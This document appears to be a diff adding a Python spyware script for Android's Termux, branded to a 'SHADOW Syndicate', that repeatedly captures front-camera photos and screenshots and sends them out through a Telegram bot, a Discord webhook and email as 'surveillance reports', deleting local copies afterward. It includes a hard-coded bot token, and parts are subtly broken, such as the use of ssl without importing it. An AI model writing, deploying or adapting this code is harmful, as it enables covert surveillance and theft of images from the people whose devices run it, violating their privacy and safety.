@@ -1,0 +1,158 @@
+#!/data/data/com.termux/files/usr/bin/python3
+# -*- coding: utf-8 -*-
+"""
+████████╗███████╗██████╗░███╗░░░███╗██╗░░██╗░██████╗  ██████╗░░█████╗░███╗░░██╗████████╗
+╚══██╔══╝██╔════╝██╔══██╗████╗░████║╚██╗██╔╝██╔════╝  ██╔══██╗██╔══██╗████╗░██║╚══██╔══╝
+░░░██║░░░█████╗░░██████╔╝██╔████╔██║░╚███╔╝░╚█████╗░  ██████╦╝██║░░██║██╔██╗██║░░░██║░░░
+░░░██║░░░██╔══╝░░██╔══██╗██║╚██╔╝██║░██╔██╗░░╚═══██╗  ██╔══██╗██║░░██║██║╚████║░░░██║░░░
+░░░██║░░░███████╗██║░░██║██║░╚═╝░██║██╔╝╚██╗██████╔╝  ██████╦╝╚█████╔╝██║░╚███║░░░██║░░░
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░  ╚═════╝░░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░
+v2.0 - Termux Edition // Property of SHADOW Syndicate
+"""
+
+import os
+import sys
+import time
+import smtplib
+import base64
+import requests
+import subprocess
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
+from datetime import datetime
+
+# ========================
+# CONFIGURATION SECTION
+# ========================
+SMTP_USER = "ghost.sender@proton.me"
+SMTP_PASS = "yourAppPasswordHere"
+SMTP_SERVER = "mail.proton.me"
+SMTP_PORT = 587
+EMAIL_RECIPIENT = "your.darknet.mail@onionmail.org"
+TELEGRAM_BOT_TOKEN = "6682511153:AAHtWNytIrV89TJWdJRGMemqkyi9Yd1vKGg"
+TELEGRAM_CHAT_ID = "6063558798"
+WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"
+# ========================
+
+def check_dependencies():
+    """Ensure required Termux packages are installed"""
+    required_pkgs = ["termux-api", "termux-tools"]
+    missing = []
+    
+    for pkg in required_pkgs:
+        if not os.path.exists(f"/data/data/com.termux/files/usr/bin/{pkg}"):
+            missing.append(pkg)
+    
+    if missing:
+        print(f"[!] Install missing packages: termux install {' '.join(missing)}")
+        sys.exit(1)
+
+def capture_webcam():
+    """Capture front camera using Termux API"""
+    try:
+        filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+        subprocess.run(["termux-camera-photo", "-c", "0", filename], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return filename if os.path.exists(filename) else None
+    except Exception:
+        return None
+
+def capture_screenshot():
+    """Capture device screen using Termux API"""
+    try:
+        filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+        subprocess.run(["termux-screenshot", "-f", filename], 
+                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return filename if os.path.exists(filename) else None
+    except Exception:
+        return None
+
+def exfiltrate_telegram(photo_path):
+    """Send photo via Telegram bot"""
+    try:
+        with open(photo_path, 'rb') as photo:
+            files = {'photo': photo}
+            data = {'chat_id': TELEGRAM_CHAT_ID}
+            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto", 
+                         files=files, data=data, timeout=10)
+    except Exception:
+        pass
+
+def exfiltrate_discord(photo_path):
+    """Send photo via Discord webhook"""
+    try:
+        with open(photo_path, 'rb') as f:
+            screenshot_data = f.read()
+        b64_image = base64.b64encode(screenshot_data).decode('utf-8')
+        payload = {
+            "content": "TERMUX SURVEILLANCE REPORT",
+            "embeds": [{
+                "title": "TARGET ACQUIRED",
+                "image": {"url": f"data:image/jpeg;base64,{b64_image}"}
+            }]
+        }
+        requests.post(WEBHOOK_URL, json=payload, timeout=10)
+    except Exception:
+        pass
+
+def exfiltrate_email(photo_path):
+    """Send photo via encrypted email"""
+    try:
+        msg = MIMEMultipart()
+        msg['Subject'] = 'TERMUX SURVEILLANCE REPORT'
+        msg['From'] = SMTP_USER
+        msg['To'] = EMAIL_RECIPIENT
+        
+        text = MIMEText("Mobile surveillance package acquired\n\n", 'plain')
+        msg.attach(text)
+        
+        if photo_path and os.path.exists(photo_path):
+            with open(photo_path, 'rb') as f:
+                img = MIMEImage(f.read(), name=os.path.basename(photo_path))
+                msg.attach(img)
+        
+        context = ssl.create_default_context()
+        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+            server.starttls(context=context)
+            server.login(SMTP_USER, SMTP_PASS)
+            server.send_message(msg)
+    except Exception:
+        pass
+
+def main():
+    """Main surveillance routine for Termux"""
+    check_dependencies()
+    
+    print("[*] Starting Termux surveillance module...")
+    print("[*] Camera and screen capture initiated")
+    
+    while True:
+        # Capture webcam
+        webcam_file = capture_webcam()
+        if webcam_file:
+            print(f"[+] Webcam captured: {webcam_file}")
+            exfiltrate_telegram(webcam_file)
+            exfiltrate_email(webcam_file)
+            os.remove(webcam_file)
+        
+        # Capture screenshot
+        screenshot_file = capture_screenshot()
+        if screenshot_file:
+            print(f"[+] Screen captured: {screenshot_file}")
+            exfiltrate_discord(screenshot_file)
+            exfiltrate_email(screenshot_file)
+            os.remove(screenshot_file)
+        
+        # Sleep between captures (adjust as needed)
+        time.sleep(60)
+
+if __name__ == "__main__":
+    try:
+        # Stealth execution
+        if "com.termux" in os.getcwd():
+            main()
+        else:
+            print("[!] Run this in Termux environment only!")
+    except KeyboardInterrupt:
+        print("\n[!] Surveillance terminated")
